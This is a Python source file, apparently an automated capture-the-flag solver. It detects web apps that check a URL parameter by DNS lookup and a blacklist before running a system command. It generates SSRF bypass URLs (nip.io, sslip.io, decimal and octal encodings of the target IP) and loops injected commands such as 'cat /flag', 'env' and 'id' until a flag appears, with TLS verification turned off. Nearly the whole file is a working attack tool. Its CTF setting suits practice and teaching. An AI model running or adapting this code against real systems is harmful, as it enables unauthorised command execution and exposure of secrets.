# -*- coding: utf-8 -*-
"""
SSRF DNS Rebinding → RCE 通用求解引擎 v1.0

题型特征:
- Flask/Django 路由接收 url 参数
- DNS 解析检查 (socket.gethostbyname / urlparse)
- 黑名单过滤特定 IP/域名
- 通过 DNS 检查后执行系统命令 (os.popen/subprocess)

Bypass 技术:
- nip.io:   1-2-3-4.nip.io → 1.2.3.4
- sslip.io: 1-2-3-4.sslip.io → 1.2.3.4
- 1u.ms:    短链 DNS
- 十进制IP: 2130706433 → 127.0.0.1
- 八进制:   0177.0.0.1 → 127.0.0.1
- IPv6:     [::ffff:127.0.0.1]

入口: auto_solve(url) → dict
"""

from __future__ import annotations
import re
import urllib.request
import urllib.parse
import ssl
import ipaddress
from typing import Optional, Callable, Dict, List, Tuple

_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
_FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,}\{[^}]{4,}\}')
_HTML_BAD = re.compile(r'&nbsp;|&lt;|&gt;|&amp;|else\{|echo[\s"]|function[\s(]|isset\(|preg_match')


def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _http_text(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': _USER_AGENT, 'Accept': '*/*'})
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ctx()) as resp:
            body = resp.read()
            try: return body.decode('utf-8', errors='replace')
            except: return body.decode('latin-1', errors='replace')
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
            try: return body.decode('utf-8', errors='replace')
            except: return body.decode('latin-1', errors='replace')
        except: return None
    except: return None


def _extract_flag(text):
    if not text:
        return None
    for m in _FLAG_RE.finditer(text):
        candidate = m.group(0)
        if not _HTML_BAD.search(candidate):
            return candidate
    return None


# ── Detection ──

_SSRF_RCE_RE = re.compile(
    r'(?:socket\.gethostbyname|urlparse|gethostbyname)',
    re.IGNORECASE
)
_POPEN_RE = re.compile(
    r'(?:os\.popen|subprocess\.(?:call|check_output|Popen|run)|commands\.getoutput)',
    re.IGNORECASE
)
_URL_PARAM_RE = re.compile(
    r'''request\.(?:args|form|values)\.get\s*\(\s*['\"]([^'\"]+)['\"]''',
    re.IGNORECASE
)
_CMD_PARAM_RE = re.compile(
    r'(?:os\.popen|subprocess\.\w+|commands\.\w+)\s*\(.*?request\.(?:args|form|values)\.get\s*\(\s*[\'\"]([^\'\"]+)[\'\"]',
    re.IGNORECASE
)
_BLACKLIST_RE = re.compile(
    r'''BlackList\s*=\s*\[(.*?)\]''',
    re.DOTALL
)
_TARGET_IP_RE = re.compile(
    r'''gethostbyname.*?==\s*[\'\"]([\d.]+)[\'\"]''',
)


def _parse_ssrf_rce(source):
    """Parse source for SSRF DNS check → RCE pattern.

    Returns dict with keys or None if pattern not detected.
    """
    has_ssrf = _SSRF_RCE_RE.search(source)
    has_rce = _POPEN_RE.search(source)

    if not (has_ssrf and has_rce):
        return None

    # Find URL parameter
    url_params = _URL_PARAM_RE.findall(source)
    cmd_params = _CMD_PARAM_RE.findall(source)

    # Find target IP
    target_ip = '127.0.0.1'
    m = _TARGET_IP_RE.search(source)
    if m:
        target_ip = m.group(1)

    # Find blacklist
    blacklist = []
    m = _BLACKLIST_RE.search(source)
    if m:
        items = re.findall(r'''['\"]([^'\"]+)['\"]''', m.group(1))
        blacklist = items

    return {
        'url_params': url_params if url_params else ['url'],
        'cmd_params': cmd_params if cmd_params else ['cmd'],
        'target_ip': target_ip,
        'blacklist': blacklist,
    }


# ── DNS rebinding payloads ──

def _ip_to_nipio(ip):
    """Convert IP to nip.io format: 1.2.3.4 → 1-2-3-4.nip.io"""
    return ip.replace('.', '-') + '.nip.io'


def _ip_to_sslipio(ip):
    """Convert IP to sslip.io format: 1.2.3.4 → 1-2-3-4.sslip.io"""
    return ip.replace('.', '-') + '.sslip.io'


def _ip_to_decimal(ip):
    """Convert IP to decimal: 127.0.0.1 → 2130706433"""
    parts = [int(p) for p in ip.split('.')]
    return str((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3])


def _ip_to_octal_first(ip):
    """Convert first octet to octal: 127.0.0.1 → 0177.0.0.1"""
    parts = ip.split('.')
    return f'0{int(parts[0]):o}.{parts[1]}.{parts[2]}.{parts[3]}'


def _generate_bypass_payloads(target_ip, blacklist):
    """Generate DNS rebinding bypass URLs for a target IP."""
    payloads = []

    # nip.io
    nip = _ip_to_nipio(target_ip)
    payloads.append(('nip.io', f'http://{nip}/'))

    # sslip.io
    ssl = _ip_to_sslipio(target_ip)
    payloads.append(('sslip.io', f'http://{ssl}/'))

    # Decimal IP (if not blacklisted)
    dec = _ip_to_decimal(target_ip)
    if dec not in str(blacklist):
        payloads.append(('decimal', f'http://{dec}/'))

    # Octal first octet
    octal = _ip_to_octal_first(target_ip)
    if octal not in str(blacklist):
        payloads.append(('octal', f'http://{octal}/'))

    # Filter out blacklisted
    final = []
    for name, url in payloads:
        blocked = any(b in url for b in blacklist)
        if not blocked:
            final.append((name, url))
    return final


# ── Main solver ──

_CMD_LIST = ['cat /flag', 'cat /flag*', 'cat /*flag*', 'tac /flag',
             'nl /flag', 'ls /', 'env', 'id']


def ssrf_rebind_solve(url, on_progress=None):
    source = _http_text(url, timeout=10)
    if not source:
        return {'flag': None, 'status': 'no_source'}

    f = _extract_flag(source)
    if f:
        return {'flag': f, 'status': 'static_flag'}

    info = _parse_ssrf_rce(source)
    if not info:
        return {'flag': None, 'status': 'not_ssrf_rce'}

    if on_progress:
        try:
            on_progress('ssrf_rebind', 'detected',
                        f'target={info["target_ip"]} blacklist={info["blacklist"]}')
        except: pass

    # Generate bypass URLs
    bypasses = _generate_bypass_payloads(info['target_ip'], info['blacklist'])

    if on_progress:
        try:
            on_progress('ssrf_rebind', 'bypasses',
                        f'{len(bypasses)} candidates: {[n for n,_ in bypasses]}')
        except: pass

    # Build base URL for the SSRF endpoint
    base = url.rstrip('/')

    for url_param in info['url_params']:
        for cmd_param in info['cmd_params']:
            for bypass_name, bypass_url in bypasses:
                for cmd in _CMD_LIST:
                    try:
                        sep = '&' if '?' in base else '?'
                        full_url = (f'{base}/ssrf{sep}'
                                    f'{url_param}={urllib.parse.quote(bypass_url)}'
                                    f'&{cmd_param}={urllib.parse.quote(cmd)}')

                        text = _http_text(full_url, timeout=15)
                        if not text:
                            continue

                        flag = _extract_flag(text)
                        if flag:
                            if on_progress:
                                try:
                                    on_progress('ssrf_rebind', 'flag!',
                                                f'{bypass_name} + {cmd}: {flag}')
                                except: pass
                            return {
                                'flag': flag,
                                'bypass': bypass_name,
                                'target_ip': info['target_ip'],
                                'cmd': cmd,
                                'status': 'solved',
                            }
                    except:
                        continue

    return {'flag': None, 'status': 'no_flag'}


def auto_solve(url, on_progress=None):
    return ssrf_rebind_solve(url, on_progress=on_progress)
